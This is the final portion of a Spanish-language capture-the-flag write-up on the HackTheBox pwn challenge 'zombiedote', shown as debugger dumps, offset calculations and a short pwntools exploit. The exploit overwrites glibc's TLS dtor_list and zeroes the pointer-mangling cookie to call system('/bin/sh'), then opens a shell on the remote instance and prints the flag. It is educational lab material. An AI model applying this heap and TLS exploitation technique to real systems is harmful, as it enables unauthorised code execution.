+<span class="code-blue">[ MANUAL MODE LOGGING ]</span>
+<span class="code-white">[1] Create log</span>
+<span class="code-white">[2] Insert into log</span>
+<span class="code-white">[3] Delete log</span>
+<span class="code-white">[4] Edit log</span>
+<span class="code-white">[5] Inspect log</span>
+<span class="code-white">&gt;&gt; 1</span>
+
+<span class="code-white">Number of samples: 17000</span>
+
+<span class="code-green">[+] Created a log.</span>
+
+<span class="code-blue">[ MANUAL MODE LOGGING ]</span>
+<span class="code-white">[1] Create log</span>
+<span class="code-white">[2] Insert into log</span>
+<span class="code-white">[3] Delete log</span>
+<span class="code-white">[4] Edit log</span>
+<span class="code-white">[5] Inspect log</span>
+<span class="code-white">&gt;&gt; 2</span>
+
+<span class="code-white">Breakpoint 1.1, <span class="code-blue">0x000055f89365c59b</span> in <span class="code-dark-yellow">insert</span> ()
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>p/x $rdi
+$1 = 0x7ffe18b283f0
+<span class="code-green">gef&gt; </span>x/4gx $rdi
+<span class="code-dark-blue">0x7ffe18b283f0</span>: 0x0000000000004268      0x00007fe9868c7010
+<span class="code-dark-blue">0x7ffe18b28400</span>: 0x0000000000000000      0x00007fe900000000
+<span class="code-green">gef&gt; </span>x/10gx 0x00007fe9868c7000
+<span class="code-dark-blue">0x7fe9868c7000</span>: 0x0000000000000000      0x0000000000022002
+<span class="code-dark-blue">0x7fe9868c7010</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fe9868c7020</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fe9868c7030</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fe9868c7040</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-green">gef&gt; </span>vmmap
+[ Legend:  <span class="code-dark-red">Code</span> | <span class="code-dark-blue">Heap</span> | <span class="code-dark-magenta">Stack</span> | <span class="code-dark-green">Writable</span> | <span>ReadOnly</span> | <span class="code-grey">None</span> | <span class="mtku">RWX</span> ]
+<span class="code-blue">Start              End                Size               Offset             Perm Path</span>
+<span>0x000055f89365b000</span> <span>0x000055f89365c000</span> <span>0x0000000000001000</span> <span>0x0000000000000000</span> <span>r--</span> <span>/home/ctf/zombiedote</span>
+<span class="code-dark-red">0x000055f89365c000</span> <span class="code-dark-red">0x000055f89365d000</span> <span class="code-dark-red">0x0000000000001000</span> <span class="code-dark-red">0x0000000000001000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/home/ctf/zombiedote</span><span class="code-blue">  &lt;-  $rip, $r13</span>
+<span>0x000055f89365d000</span> <span>0x000055f89365e000</span> <span>0x0000000000001000</span> <span>0x0000000000002000</span> <span>r--</span> <span>/home/ctf/zombiedote<span class="code-blue">  &lt;-  $rdx</span>
+<span>0x000055f89365e000</span> <span>0x000055f89365f000</span> <span>0x0000000000001000</span> <span>0x0000000000002000</span> <span>r--</span> <span>/home/ctf/zombiedote</span>
+<span class="code-dark-green">0x000055f89365f000</span> <span class="code-dark-green">0x000055f893660000</span> <span class="code-dark-green">0x0000000000001000</span> <span class="code-dark-green">0x0000000000003000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">/home/ctf/zombiedote</span>
+<span class="code-dark-green">0x000055f893660000</span> <span class="code-dark-green">0x000055f893661000</span> <span class="code-dark-green">0x0000000000001000</span> <span class="code-dark-green">0x0000000000005000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">/home/ctf/zombiedote</span>
+<span class="code-dark-green">0x000055f893661000</span> <span class="code-dark-green">0x000055f893662000</span> <span class="code-dark-green">0x0000000000001000</span> <span class="code-dark-green">0x0000000000006000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">/home/ctf/zombiedote</span>
+<span class="code-dark-green">0x000055f893662000</span> <span class="code-dark-green">0x000055f893663000</span> <span class="code-dark-green">0x0000000000001000</span> <span class="code-dark-green">0x0000000000007000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">/home/ctf/zombiedote</span>
+<span class="code-dark-blue">0x000055f89458c000</span> <span class="code-dark-blue">0x000055f8945ad000</span> <span class="code-dark-blue">0x0000000000021000</span> <span class="code-dark-blue">0x0000000000000000</span> <span class="code-dark-blue">rw-</span> <span class="code-dark-blue">[heap]</span>
+<span class="code-dark-green">0x00007fe9868c7000</span> <span class="code-dark-green">0x00007fe9868ec000</span> <span class="code-dark-green">0x0000000000025000</span> <span class="code-dark-green">0x0000000000000000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">&lt;tls-th1&gt;</span>
+<span>0x00007fe9868ec000</span> <span>0x00007fe986918000</span> <span>0x000000000002c000</span> <span>0x0000000000000000</span> <span>r--</span> <span>/home/ctf/glibc/libc.so.6</span>
+<span class="code-dark-red">0x00007fe986918000</span> <span class="code-dark-red">0x00007fe986aac000</span> <span class="code-dark-red">0x0000000000194000</span> <span class="code-dark-red">0x000000000002c000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/home/ctf/glibc/libc.so.6</span>
+<span>0x00007fe986aac000</span> <span>0x00007fe986b00000</span> <span>0x0000000000054000</span> <span>0x00000000001c0000</span> <span>r--</span> <span>/home/ctf/glibc/libc.so.6<span class="code-blue">  &lt;-  $r10, $r11</span>  
+<span class="code-grey">0x00007fe986b00000</span> <span class="code-grey">0x00007fe986b01000</span> <span class="code-grey">0x0000000000001000</span> <span class="code-grey">0x0000000000214000</span> <span class="code-grey">---</span> <span class="code-grey">/home/ctf/glibc/libc.so.6</span>
+<span>0x00007fe986b01000</span> <span>0x00007fe986b04000</span> <span>0x0000000000003000</span> <span>0x0000000000214000</span> <span>r--</span> <span>/home/ctf/glibc/libc.so.6</span>
+<span class="code-dark-green">0x00007fe986b04000</span> <span class="code-dark-green">0x00007fe986b07000</span> <span class="code-dark-green">0x0000000000003000</span> <span class="code-dark-green">0x0000000000217000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">/home/ctf/glibc/libc.so.6</span>
+<span class="code-dark-green">0x00007fe986b07000</span> <span class="code-dark-green">0x00007fe986b16000</span> <span class="code-dark-green">0x000000000000f000</span> <span class="code-dark-green">0x0000000000000000</span> <span class="code-dark-green">rw-</span>
+<span>0x00007fe986b16000</span> <span>0x00007fe986b17000</span> <span>0x0000000000001000</span> <span>0x0000000000000000</span> <span>r--</span> <span>/home/ctf/glibc/ld-2.34.so</span>
+<span class="code-dark-red">0x00007fe986b17000</span> <span class="code-dark-red">0x00007fe986b3f000</span> <span class="code-dark-red">0x0000000000028000</span> <span class="code-dark-red">0x0000000000001000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/home/ctf/glibc/ld-2.34.so</span>
+<span>0x00007fe986b3f000</span> <span>0x00007fe986b49000</span> <span>0x000000000000a000</span> <span>0x0000000000029000</span> <span>r--</span> <span>/home/ctf/glibc/ld-2.34.so</span>
+<span>0x00007fe986b49000</span> <span>0x00007fe986b4b000</span> <span>0x0000000000002000</span> <span>0x0000000000032000</span> <span>r--</span> <span>/home/ctf/glibc/ld-2.34.so<span class="code-blue">  &lt;-  $r15</span>
+<span class="code-dark-green">0x00007fe986b4b000</span> <span class="code-dark-green">0x00007fe986b4d000</span> <span class="code-dark-green">0x0000000000002000</span> <span class="code-dark-green">0x0000000000034000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">/home/ctf/glibc/ld-2.34.so</span>
+<span class="code-dark-magenta">0x00007ffe18b09000</span> <span class="code-dark-magenta">0x00007ffe18b2a000</span> <span class="code-dark-magenta">0x0000000000021000</span> <span class="code-dark-magenta">0x0000000000000000</span> <span class="code-dark-magenta">rw-</span> <span class="code-dark-magenta">[stack]</span><span class="code-blue">  &lt;-  $rax, $rsp, $rbp, $rdi, $r12</span>
+<span>0x00007ffe18b66000</span> <span>0x00007ffe18b6a000</span> <span>0x0000000000004000</span> <span>0x0000000000000000</span> <span>r--</span> <span>[vvar]</span>
+<span class="code-dark-red">0x00007ffe18b6a000</span> <span class="code-dark-red">0x00007ffe18b6c000</span> <span class="code-dark-red">0x0000000000002000</span> <span class="code-dark-red">0x0000000000000000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">[vdso]</span>
+<span class="code-dark-red">0xffffffffff600000</span> <span class="code-dark-red">0xffffffffff601000</span> <span class="code-dark-red">0x0000000000001000</span> <span class="code-dark-red">0x0000000000000000</span> <span class="code-dark-red">--x</span> <span class="code-dark-red">[vsyscall]</span>
+</code></pre></div><p>Sorprendentemente, ¡tenemos una posición diferente! Ahora el <em>chunk</em> de <code>mmap</code> está posicionado antes de <code>libc.so.6</code> (<code>&lt;tls-th1></code>), con un <em>offset</em>_ fijo, no hay páginas de guarda. Aún hay más, los <em>offsets</em> entre <code>libc.so.6</code> y <code>ld-2.34.so</code> son fijos. Como resultado, una vez que tenemos la dirección base de Glibc, podemos realizar varias técnicas de <a href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md">la lista</a>.</p><p>Ya que ya tenía la configuración para filtrar <code>__GI__dl_catch_error</code> (en la última sección de <code>ld-2.34.so</code>), encontré su <em>offset</em> relativo y la cambié en el <em>exploit</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/30gx 0x00007fe986b4b000
+<span class="code-dark-blue">0x7fe986b4b000</span>: 0x0000000000034e70      0x0000000000000000
+<span class="code-dark-blue">0x7fe986b4b010</span>: 0x0000000000000000      0x00007fe986a64140
+<span class="code-dark-blue">0x7fe986b4b020</span> &lt;<span class="code-dark-yellow">_dl_signal_exception@got.plt</span>&gt;:  0x00007fe986a64080      0x00007fe986a640e0  
+<span class="code-dark-blue">0x7fe986b4b030</span> &lt;<span class="code-dark-yellow">_dl_catch_error@got.plt</span>&gt;:       0x00007fe986a64260      0x0000000000000000
+<span class="code-dark-blue">0x7fe986b4b040</span> &lt;<span class="code-dark-yellow">_rtld_global</span>&gt;:  0x00007fe986b4c220      0x0000000000000004
+<span class="code-dark-blue">0x7fe986b4b050</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+16&gt;:       0x00007fe986b4c4e0      0x0000000000000000
+<span class="code-dark-blue">0x7fe986b4b060</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+32&gt;:       0x00007fe986b142b0      0x0000000000000000
+<span class="code-dark-blue">0x7fe986b4b070</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+48&gt;:       0x0000000000000000      0x0000000000000001
+<span class="code-dark-blue">0x7fe986b4b080</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+64&gt;:       0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fe986b4b090</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+80&gt;:       0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fe986b4b0a0</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+96&gt;:       0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fe986b4b0b0</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+112&gt;:      0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fe986b4b0c0</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+128&gt;:      0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fe986b4b0d0</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+144&gt;:      0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fe986b4b0e0</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+160&gt;:      0x0000000000000000      0x0000000000000000
+<span class="code-green">gef&gt; </span>x 0x00007fe986a64260
+<span class="code-dark-blue">0x7fe986a64260</span> &lt;<span class="code-dark-yellow">__GI__dl_catch_error</span>&gt;:  0x89495441fa1e0ff3
+<span class="code-green">gef&gt; </span>p/d (0x7fe986b4b030 - 0x00007fe9868c7010) / 8
+$2 = 329732
+</code></pre></div><h3 id="tls-storage-dtor_list">TLS-storage <code>dtor_list</code></h3><p>Para que esta técnica funcione, necesitamos modificar dos valores en TLS-storage:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>tls
+$tls = 0x7fe9868e9740
+<span class="code-dark-cyan">----------------------------------------------- TLS-0x80 -----------------------------------------------</span>
+<span class="code-dark-cyan">0x7fe9868e96c0</span>|+0x0000|+000: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e96c8</span>|+0x0008|+001: <span>0x00007fe986aad4c0</span> &lt;_nl_C_LC_CTYPE_tolower+0x200&gt;  -&gt;  0x0000000100000000  
+<span class="code-dark-cyan">0x7fe9868e96d0</span>|+0x0010|+002: <span>0x00007fe986aadac0</span> &lt;_nl_C_LC_CTYPE_toupper+0x200&gt;  -&gt;  0x0000000100000000
+<span class="code-dark-cyan">0x7fe9868e96d8</span>|+0x0018|+003: <span>0x00007fe986aae3c0</span> &lt;_nl_C_LC_CTYPE_class+0x100&gt;  -&gt;  0x0002000200020002
+<span class="code-dark-cyan">0x7fe9868e96e0</span>|+0x0020|+004: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e96e8</span>|+0x0028|+005: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e96f0</span>|+0x0030|+006: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e96f8</span>|+0x0038|+007: <span class="code-dark-blue">0x000055f89458c010</span>  -&gt;  0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e9700</span>|+0x0040|+008: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e9708</span>|+0x0048|+009: <span class="code-dark-green">0x00007fe986b04c60</span> &lt;main_arena&gt;  -&gt;  0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e9710</span>|+0x0050|+010: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e9718</span>|+0x0058|+011: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e9720</span>|+0x0060|+012: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e9728</span>|+0x0068|+013: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e9730</span>|+0x0070|+014: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e9738</span>|+0x0078|+015: 0x0000000000000000
+<span class="code-dark-cyan">------------------------------------------------- TLS -------------------------------------------------</span>
+<span class="code-dark-cyan">0x7fe9868e9740</span>|+0x0000|+000: <span class="code-dark-green">0x00007fe9868e9740</span>  -&gt;  [loop detected]
+<span class="code-dark-cyan">0x7fe9868e9748</span>|+0x0008|+001: <span class="code-dark-green">0x00007fe9868ea160</span>  -&gt;  0x0000000000000001
+<span class="code-dark-cyan">0x7fe9868e9750</span>|+0x0010|+002: <span class="code-dark-green">0x00007fe9868e9740</span>  -&gt;  [loop detected]
+<span class="code-dark-cyan">0x7fe9868e9758</span>|+0x0018|+003: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e9760</span>|+0x0020|+004: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e9768</span>|+0x0028|+005: 0x74d612ea6aec0500<span class="code-blue">  &lt;-  canary</span>
+<span class="code-dark-cyan">0x7fe9868e9770</span>|+0x0030|+006: 0xbc9a97aebc9274e2<span class="code-blue">  &lt;-  PTR_MANGLE cookie</span>
+<span class="code-dark-cyan">0x7fe9868e9778</span>|+0x0038|+007: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e9780</span>|+0x0040|+008: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e9788</span>|+0x0048|+009: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e9790</span>|+0x0050|+010: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e9798</span>|+0x0058|+011: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e97a0</span>|+0x0060|+012: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e97a8</span>|+0x0068|+013: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e97b0</span>|+0x0070|+014: 0x0000000000000000
+<span class="code-dark-cyan">0x7fe9868e97b8</span>|+0x0078|+015: 0x0000000000000000
+</code></pre></div><p>El primero es <code>PTR_MANGLE cookie</code> (<code>0x7fe9868e9770</code>, <code>TLS +0x0030</code>). Este valor se usa para cifrar punteros (desplazamientos y XOR). Si ponemos <code>PTR_MANGLE cookie</code> a cero, la operación XOR no hace nada, y el cifrado se comportará como un desplazamiento. Esto nos permitirá ingresar la dirección de <code>system</code> desplazada 17 bits a la izquierda, de modo que la operación de <em>mangling</em> desplaza hacia la derecha y vuelve a <code>system</code> (y el XOR no hace nada).</p><p>Y el otro valor que necesitamos es un puntero a nuestro <em>chunk</em> de <code>mmap</code> (ahora podemos obtener su dirección absoluta, porque el <em>offset</em> relativo a Glibc es fijo). Debemos agregarlo a <code>0x7fe9868e96e8</code> (<code>TLS-0x80 +0x0028</code>). Esto difiere un poco de la <a href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#5---code-execution-via-tls-storage-dtor_list-overwrite">explicación de la técnica</a> porque algunos valores son un índice anterior.</p><p>Con esto, el programa llamará a la dirección en <code>*(TLS-0x80 +0x0028)</code> usando argumentos en <code>*(TLS-0x80 +0x0028) + 8</code> al llamar a <code>exit</code>.</p><p>Entonces, tomemos los <em>offsets</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>p/x 0x00007fe9868ec000 - 0x00007fe9868c7010
+$4 = 0x24ff0
+<span class="code-green">gef&gt; </span>p/d (0x7fe9868e96e8 - 0x00007fe9868c7010) / 8  
+$5 = 17627
+<span class="code-green">gef&gt; </span>p/d (0x7fe9868e9770 - 0x00007fe9868c7010) / 8
+$6 = 17644
+</code></pre></div><p>Y así, este es el exploit final, bastante corto y simple:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">17000</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk8">pack</span><span class="mtk1">(</span><span class="mtk4">'d'</span><span class="mtk1">, </span><span class="mtk8">inspect</span><span class="mtk1">(</span><span class="mtk6">329732</span><span class="mtk1">))) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.</span><span class="mtk6">__GI__dl_catch_error</span>  
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">mmap_chunk</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">24ff0</span>
+
+<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk6">17627</span><span class="mtk1">, </span><span class="mtk8">unpack</span><span class="mtk1">(</span><span class="mtk4">'d'</span><span class="mtk1">, p64(</span><span class="mtk1">mmap_chunk</span><span class="mtk1">))[</span><span class="mtk6">0</span><span class="mtk1">])</span>
+<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk6">17644</span><span class="mtk1">, </span><span class="mtk6">0</span>)</span>
+
+<span class="mtk1">    </span><span class="mtk8">insert</span><span class="mtk1">([</span>
+<span class="mtk1">        </span><span class="mtk8">unpack</span><span class="mtk1">(</span><span class="mtk4">'d'</span><span class="mtk1">, p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> </span><span class="mtk6">17</span><span class="mtk1">))[</span><span class="mtk6">0</span><span class="mtk1">],</span>
+<span class="mtk1">        </span><span class="mtk8">unpack</span><span class="mtk1">(</span><span class="mtk4">'d'</span><span class="mtk1">, p64(</span><span class="mtk7">next</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk8">search</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh'</span><span class="mtk1">))))[</span><span class="mtk6">0</span><span class="mtk1">],</span>
+<span class="mtk1">    ])</span>
+
+<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">()</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
+</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>En este punto, podemos obtener una <em>shell</em> en la instancia remota:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 94.237.56.248:52869
+[<span class="code-blue">*</span>] './zombiedote'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc'</span>
+[<span class="code-green">+</span>] Opening connection to 94.237.56.248 on port 52869: Done  
+[<span class="code-green">+</span>] Glibc base address: 0x7fb7d40ee000
+[<span class="code-blue">*</span>] Switching to interactive mode
+
+<span class="code-red">[-] O</span>peration not implemented yet. Exiting...
+
+<span class="code-red">$</span> ls
+flag.txt
+glibc
+zombiedote
+<span class="code-red">$</span> cat flag.txt
+HTB{y0u_r3tr13v3d_th3_r3s34rcH_n0t3s_4m4z1ng_j0b_u_54v3d_d4_w0rld}
+</code></pre></div><p>El código del <em>exploit</em> completo está aquí: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Zombienator/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#función-de-asignación">Función de asignación</a></li><li><a href="#función-de-inserción">Función de inserción</a></li><li><a href="#función-de-liberación">Función de liberación</a></li><li><a href="#función-de-edición">Función de edición</a></li><li><a href="#función-de-información">Función de información</a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a><ul><li><a href="#_chunk_-de-mmap"><em>Chunk</em> de <code>mmap</code></a></li><li><a href="#fugando-direcciones-de-memoria">Fugando direcciones de memoria</a></li></ul></li><li><a href="#desarrollo-de-explotación">Desarrollo de explotación</a><ul><li><a href="#obteniendo-rce">Obteniendo RCE</a></li><li><a href="#cambiando-a-docker">Cambiando a Docker</a></li><li><a href="#tls-storage-dtor_list">TLS-storage <code>dtor_list</code></a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
